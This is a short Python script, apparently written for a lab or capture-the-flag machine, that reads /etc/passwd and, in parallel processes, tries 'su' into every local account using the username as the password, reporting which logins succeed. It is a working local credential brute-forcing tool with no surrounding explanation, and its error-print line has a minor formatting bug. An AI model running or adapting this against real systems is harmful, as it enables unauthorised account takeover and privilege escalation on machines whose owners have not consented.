#!/usr/bin/python3

# Found the original script at https://stackoverflow.com/questions/5286321/pam-authentication-in-python-without-root-privileges and then modified

import pexpect
from multiprocessing import Process

def authPam(username, password):
        result = 0
        try:
                child = pexpect.spawn('/bin/su - %s'%(username))
                child.expect('Password:')
                child.sendline(password)
                result=child.expect(['su: Authentication failure',username])
                # After successful auth - change the above, execute a command as vagrant... "vagrant@qdpmLights:~$"
                child.close()
        except Exception as err:
                child.close()
                print ("Error authenticating. Reason: "%(err))
                return True
        if result == 0:
                print ("Authentication failed for user %s."%(username))
                return True
        else:
                print ("Authentication succeeded for user %s."%(username))
                return True

def main():
        #authPam(username='root',password='root')
        # Read the /etc/passwd file and gather the contents
        text = open('/etc/passwd', 'r').readlines()
        for line in text:
                item = line.split(":")
                uname = item[0].strip()
                #authPam(username=uname, password=uname)
                # Added multiprocessing to dramatically speed up the results
                p = Process(target=authPam, args=(uname, uname,))
                p.start()


if __name__ == '__main__':
        main()        
